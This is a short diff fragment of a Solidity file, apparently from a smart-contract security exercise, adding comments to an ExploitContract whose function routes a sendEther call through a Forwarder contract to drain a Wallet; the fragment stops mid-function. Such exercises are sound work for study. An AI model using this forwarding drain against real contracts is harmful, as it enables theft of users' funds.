@@ -23,7 +23,11 @@ contract Forwarder {
     }
 }
 
+// add your exploiter contract here
 contract ExploitContract {
+    /**
+     * easy call forwarding to drain Wallet
+     */
     function exploit(Forwarder forwarder, address wallet) public {
         bytes memory data = abi.encodeWithSignature(
             "sendEther(address,uint256)",
